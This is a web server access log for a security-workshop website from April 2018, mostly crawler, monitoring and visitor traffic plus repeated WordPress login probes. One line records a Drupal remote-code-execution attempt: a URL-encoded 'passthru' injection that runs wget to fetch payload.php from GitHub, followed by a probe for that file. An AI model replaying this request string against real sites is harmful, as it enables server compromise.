66.249.73.91 - - [28/Apr/2018:15:03:26 -0400] "GET /papers/2012/docs/p127.pdf HTTP/1.1" 304 3606 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [28/Apr/2018:15:04:38 -0400] "GET /papers/2005/nspw2005-frontmatter.pdf HTTP/1.1" 200 1584886 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [28/Apr/2018:15:05:14 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.91 - - [28/Apr/2018:15:05:49 -0400] "GET /papers/2008/nspw2008-crandall.pdf HTTP/1.1" 200 425114 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.167.194 - - [28/Apr/2018:15:06:53 -0400] "GET /papers/2005/nspw2005-bishop-panel.pdf HTTP/1.1" 200 355380 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.87 - - [28/Apr/2018:15:07:01 -0400] "GET /papers/2012/docs/p53.pdf HTTP/1.1" 304 3606 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
109.222.38.179 - - [28/Apr/2018:15:07:05 -0400] "GET /favicon.ico HTTP/1.1" 404 4109 "https://www.nspw.org/2009/proceedings/2010/nspw2010-sun.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
66.249.73.87 - - [28/Apr/2018:15:08:12 -0400] "GET /papers/2013/nspw2013-sundaramurthy.pdf HTTP/1.1" 200 355688 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
125.209.235.181 - - [28/Apr/2018:15:08:14 -0400] "GET /2017 HTTP/1.1" 200 7090 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1"
125.209.235.186 - - [28/Apr/2018:15:08:19 -0400] "GET /2017 HTTP/1.1" 200 7090 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
66.249.73.91 - - [28/Apr/2018:15:09:22 -0400] "GET /papers/2012/docs/p27.pdf HTTP/1.1" 304 3606 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
109.67.232.187 - - [28/Apr/2018:15:09:38 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
109.67.232.187 - - [28/Apr/2018:15:09:38 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [28/Apr/2018:15:10:14 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [28/Apr/2018:15:10:34 -0400] "GET /papers/2008/nspw2008-mannan.pdf HTTP/1.1" 200 387310 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [28/Apr/2018:15:11:45 -0400] "GET /papers/2005/nspw2005-beznosov.pdf HTTP/1.1" 200 1827053 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [28/Apr/2018:15:12:56 -0400] "GET /2018/dates HTTP/1.1" 200 6270 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [28/Apr/2018:15:14:08 -0400] "GET /papers/2012/docs/p105.pdf HTTP/1.1" 304 3606 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [28/Apr/2018:15:15:14 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [28/Apr/2018:15:15:19 -0400] "GET /papers/1999/nspw1999-olthoff-3.pdf HTTP/1.1" 200 1119674 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
54.37.149.75 - - [28/Apr/2018:15:15:30 -0400] "GET /?q=user%2Fpassword&name%5B%23post_render%5D%5B%5D=passthru&name%5B%23type%5D=markup&name%5B%23markup%5D=wget+https%3A%2F%2Fraw.githubusercontent.com%2Fdr-iman%2FSpiderProject%2Fmaster%2Flib%2Fexploits%2Fweb-app%2Fwordpress%2Fads-manager%2Fpayload.php HTTP/1.1" 200 6205 "-" "Mozilla 5.0"
54.37.149.75 - - [28/Apr/2018:15:15:38 -0400] "GET /?q=file%2Fajax%2Fname%2F%23value%2Fform-MF1bkk1j1oiqdDigjyugbPpL64LJfRVuXuLIi66ALmM HTTP/1.1" 200 4338 "-" "Mozilla 5.0"
158.181.44.99 - - [28/Apr/2018:15:15:59 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
158.181.44.99 - - [28/Apr/2018:15:16:01 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
54.37.149.75 - - [28/Apr/2018:15:16:10 -0400] "GET /payload.php HTTP/1.1" 404 8012 "-" "Mozilla 5.0"
66.249.73.87 - - [28/Apr/2018:15:16:30 -0400] "GET /papers/2012/docs/p141.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
167.62.126.233 - - [28/Apr/2018:15:16:49 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
167.62.126.233 - - [28/Apr/2018:15:16:50 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
109.222.38.179 - - [28/Apr/2018:15:07:04 -0400] "GET /2009/proceedings/2010/nspw2010-sun.pdf HTTP/1.1" 200 6651276 "https://scholar.google.fr/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
66.249.73.91 - - [28/Apr/2018:15:17:41 -0400] "GET /papers/2012/forms/contents.htm HTTP/1.1" 304 3604 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [28/Apr/2018:15:18:53 -0400] "GET /papers/2005/nspw2005-schwarting.pdf HTTP/1.1" 200 692999 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
216.244.66.236 - - [28/Apr/2018:15:18:58 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
66.249.73.91 - - [28/Apr/2018:15:20:04 -0400] "GET /papers/2008/nspw2008-shirley.pdf HTTP/1.1" 200 558791 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [28/Apr/2018:15:20:14 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
189.41.219.136 - - [28/Apr/2018:15:20:20 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
189.41.219.136 - - [28/Apr/2018:15:20:22 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
222.254.34.129 - - [28/Apr/2018:15:20:56 -0400] "GET / HTTP/1.1" 200 11650 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:x.x.x) Gecko/20041107 Firefox/x.x"
125.209.235.182 - - [28/Apr/2018:15:21:13 -0400] "GET /cfp/flyer_NSPW_2013.pdf HTTP/1.1" 200 95766 "-" "Mozilla/5.0 (compatible; Yeti/1.1; +http://naver.me/spd)"
66.249.73.89 - - [28/Apr/2018:15:21:16 -0400] "GET /papers/2001/nspw2001-hosmer.pdf HTTP/1.1" 200 70429 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [28/Apr/2018:15:22:27 -0400] "GET /papers/1994/nspw1994-dobson.pdf HTTP/1.1" 200 710567 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [28/Apr/2018:15:23:38 -0400] "GET /papers/2012/docs/organization.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
5.55.46.34 - - [28/Apr/2018:15:24:39 -0400] "GET /wp-login.php HTTP/1.1" 404 8018 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
5.55.46.34 - - [28/Apr/2018:15:24:39 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [28/Apr/2018:15:24:50 -0400] "GET /papers/2007/nspw2007-chow.pdf HTTP/1.1" 200 420040 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [28/Apr/2018:15:25:14 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [28/Apr/2018:15:26:00 -0400] "GET /2009/proceedings/1997/nspw1997-rahman.pdf HTTP/1.1" 304 3606 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [28/Apr/2018:15:27:06 -0400] "GET /papers/2004/ HTTP/1.1" 200 4363 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.91 - - [28/Apr/2018:15:27:12 -0400] "GET /papers/2012/forms/authors.htm HTTP/1.1" 304 3604 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
111.95.220.183 - - [28/Apr/2018:15:28:12 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
111.95.220.183 - - [28/Apr/2018:15:28:13 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.89 - - [28/Apr/2018:15:28:23 -0400] "GET /papers/2012/docs/welcome2.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [28/Apr/2018:15:29:35 -0400] "GET /papers/1994/nspw1994-spalka.pdf HTTP/1.1" 200 982509 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [28/Apr/2018:15:30:14 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
143.59.139.137 - - [28/Apr/2018:15:30:34 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
143.59.139.137 - - [28/Apr/2018:15:30:34 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
89.200.40.79 - - [28/Apr/2018:15:30:37 -0400] "GET / HTTP/1.1" 200 6425 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1"
89.200.40.79 - - [28/Apr/2018:15:30:38 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 3943 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
89.200.40.79 - - [28/Apr/2018:15:30:38 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
89.200.40.79 - - [28/Apr/2018:15:30:38 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
89.200.40.79 - - [28/Apr/2018:15:30:39 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
89.200.40.79 - - [28/Apr/2018:15:30:39 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
89.200.40.79 - - [28/Apr/2018:15:30:39 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 729 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
89.200.40.79 - - [28/Apr/2018:15:30:39 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
89.200.40.79 - - [28/Apr/2018:15:30:39 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
89.200.40.79 - - [28/Apr/2018:15:30:39 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
89.200.40.79 - - [28/Apr/2018:15:30:40 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
66.249.73.89 - - [28/Apr/2018:15:30:46 -0400] "GET /papers/2012/docs/sponsors.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.26 - - [28/Apr/2018:15:31:20 -0400] "GET /papers/2009/nspw2009- HTTP/1.1" 404 8014 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.73.91 - - [28/Apr/2018:15:31:57 -0400] "GET /2009/proceedings/2001/nspw2001-brostoff.pdf HTTP/1.1" 200 1048585 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [28/Apr/2018:15:32:05 -0400] "GET /current/oc.shtml HTTP/1.1" 404 8006 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.151 - - [28/Apr/2018:15:32:20 -0400] "GET /2005/cfp/CFP.dvi HTTP/1.1" 200 12847 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.149 - - [28/Apr/2018:15:33:20 -0400] "GET /2003/hold/?C=D;O=A HTTP/1.1" 200 21083 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
201.37.82.89 - - [28/Apr/2018:15:33:58 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
201.37.82.89 - - [28/Apr/2018:15:33:58 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [28/Apr/2018:15:34:21 -0400] "GET /2005/cfp/latex/talk4.ps HTTP/1.1" 200 224633 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
41.107.10.135 - - [28/Apr/2018:15:34:29 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
41.107.10.135 - - [28/Apr/2018:15:34:31 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [28/Apr/2018:15:35:14 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [28/Apr/2018:15:35:31 -0400] "GET /papers/2006/nspw2006-greenwald.pdf HTTP/1.1" 200 129987 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [28/Apr/2018:15:35:40 -0400] "GET /papers/1999/nspw1999-jonsson.pdf HTTP/1.1" 200 774448 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
172.56.11.202 - - [28/Apr/2018:15:36:24 -0400] "GET /papers/2007/nspw2007-mannan.pdf HTTP/1.1" 200 300069 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1"
66.249.73.87 - - [28/Apr/2018:15:36:42 -0400] "GET /papers/2005/nspw2005-van_oorschot.pdf HTTP/1.1" 200 2313784 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
172.56.11.202 - - [28/Apr/2018:15:37:06 -0400] "GET /papers/2007/nspw2007-mannan.pdf HTTP/1.1" 200 116757 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1"
66.249.73.87 - - [28/Apr/2018:15:37:54 -0400] "GET /papers/2000/nspw2000-daniels.pdf HTTP/1.1" 200 522507 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [28/Apr/2018:15:37:50 -0400] "GET /papers/2000/nspw2000-mcdermott.pdf HTTP/1.1" 200 378080 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
172.56.11.202 - - [28/Apr/2018:15:38:02 -0400] "GET /papers/2007/nspw2007-mannan.pdf HTTP/1.1" 200 300069 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1"
66.249.73.91 - - [28/Apr/2018:15:39:05 -0400] "GET /papers/2005/nspw2005-littlewood.pdf HTTP/1.1" 200 652671 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [28/Apr/2018:15:39:15 -0400] "GET /2005/PC/sreekanth%20malladi%20paper%20and%20justification.pdf HTTP/1.1" 404 8094 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
189.216.85.14 - - [28/Apr/2018:15:39:53 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [28/Apr/2018:15:39:53 -0400] "GET /2002/index.content HTTP/1.1" 200 4617 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
189.216.85.14 - - [28/Apr/2018:15:39:54 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [28/Apr/2018:15:40:06 -0400] "GET /current/pc.shtml HTTP/1.1" 404 8006 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [28/Apr/2018:15:40:14 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [28/Apr/2018:15:40:16 -0400] "GET /papers/1998/nspw1998-abrams.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [28/Apr/2018:15:41:28 -0400] "GET /papers/2004/nspw2004-haldar.pdf HTTP/1.1" 200 80720 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [28/Apr/2018:15:42:39 -0400] "GET /papers/2003/nspw2003-eustice.pdf HTTP/1.1" 200 698366 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [28/Apr/2018:15:43:50 -0400] "GET /papers/1994/nspw1994-ovchinnikov.pdf HTTP/1.1" 200 796285 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [28/Apr/2018:15:45:01 -0400] "GET /papers/1993/nspw1993-michael.pdf HTTP/1.1" 200 642526 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [28/Apr/2018:15:45:14 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
86.99.186.159 - - [28/Apr/2018:15:45:31 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
86.99.186.159 - - [28/Apr/2018:15:45:33 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.91 - - [28/Apr/2018:15:46:12 -0400] "GET /papers/1998/nspw1998-greenwald.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [28/Apr/2018:15:47:24 -0400] "GET /papers/1993/nspw1993-lapadula.pdf HTTP/1.1" 200 730603 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [28/Apr/2018:15:48:35 -0400] "GET /papers/1994/nspw1994-schneier.pdf HTTP/1.1" 200 336786 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
117.195.105.82 - - [28/Apr/2018:15:48:57 -0400] "GET /wp-login.php HTTP/1.1" 404 7484 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
196.217.120.83 - - [28/Apr/2018:15:49:25 -0400] "GET /wp-login.php HTTP/1.1" 404 7686 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
196.217.120.83 - - [28/Apr/2018:15:49:26 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [28/Apr/2018:15:49:46 -0400] "GET /papers/2012/docs/p115.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
5.255.250.67 - - [28/Apr/2018:15:50:03 -0400] "GET /2007/tmp/?C=S;O=A HTTP/1.1" 403 3965 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [28/Apr/2018:15:50:14 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
54.70.40.11 - - [28/Apr/2018:15:50:18 -0400] "GET /robots.txt HTTP/1.1" 200 4286 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
66.249.73.87 - - [28/Apr/2018:15:50:57 -0400] "GET /proceedings/2005 HTTP/1.1" 200 7170 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [28/Apr/2018:15:51:01 -0400] "GET /modules/user/user.css?p7r9uw HTTP/1.1" 200 4456 "https://www.nspw.org/proceedings/2005" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [28/Apr/2018:15:51:01 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 472 "https://www.nspw.org/proceedings/2005" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [28/Apr/2018:15:51:01 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 5370 "https://www.nspw.org/proceedings/2005" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [28/Apr/2018:15:51:02 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 746 "https://www.nspw.org/proceedings/2005" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [28/Apr/2018:15:51:02 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 771 "https://www.nspw.org/proceedings/2005" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [28/Apr/2018:15:51:03 -0400] "GET /modules/field/theme/field.css?p7r9uw HTTP/1.1" 200 599 "https://www.nspw.org/proceedings/2005" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [28/Apr/2018:15:51:03 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 505 "https://www.nspw.org/proceedings/2005" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [28/Apr/2018:15:51:04 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 1585 "https://www.nspw.org/proceedings/2005" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [28/Apr/2018:15:51:04 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 2307 "https://www.nspw.org/proceedings/2005" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [28/Apr/2018:15:51:05 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 1025 "https://www.nspw.org/proceedings/2005" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
35.226.23.240 - - [28/Apr/2018:15:52:08 -0400] "GET /robots.txt HTTP/1.1" 200 4480 "-" "ltx71 - (http://ltx71.com/)"
66.249.73.91 - - [28/Apr/2018:15:52:09 -0400] "GET /papers/1994/nspw1994-limoges.pdf HTTP/1.1" 200 983974 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
111.206.36.19 - - [28/Apr/2018:15:52:13 -0400] "GET / HTTP/1.1" 200 7085 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
111.206.36.19 - - [28/Apr/2018:15:52:13 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 2303 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
111.206.36.19 - - [28/Apr/2018:15:52:13 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 1029 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
111.206.36.145 - - [28/Apr/2018:15:52:13 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 902 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
111.206.36.11 - - [28/Apr/2018:15:52:13 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 1734 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
111.206.36.19 - - [28/Apr/2018:15:52:13 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 517 "https://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
